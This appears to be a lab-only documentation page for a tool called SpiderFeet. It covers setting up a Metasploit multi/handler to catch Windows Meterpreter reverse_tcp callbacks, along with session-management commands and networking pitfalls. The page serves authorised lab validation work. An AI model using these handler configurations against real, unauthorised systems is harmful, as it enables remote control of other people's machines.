# Sessions and Handler Patterns

Lab-only path for validating reverse payloads. Not a default SpiderFeet discovery scenario.

## multi/handler setup

```text
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4444
run -j
```

`PAYLOAD` / `LHOST` / `LPORT` must match the `msfvenom -p …` generation line.

## Session commands

| Command | Role |
|---------|------|
| `sessions -l` | List |
| `sessions -i <id>` | Interact |
| `sessions -k <id>` | Kill |
| `sessions -k 1,3-5` | Kill ranges (comma; `-` / `..`) |

Background jobs: `jobs`, `jobs -k <id>`.

## Evidence for SpiderFeet

Treat session metadata (remote host, user, payload type, open time) as **sensitive structured findings**. Prefer documenting that a lab callback succeeded over extracting post-exploitation loot into general OSINT graphs.

## Pitfalls

- NAT/firewall: LHOST must be reachable from the victim lab VM.
- Staged vs stageless: if stage download fails, regenerate stageless and re-pair handler.
- Do not leave handlers listening on shared networks outside the lab charter.
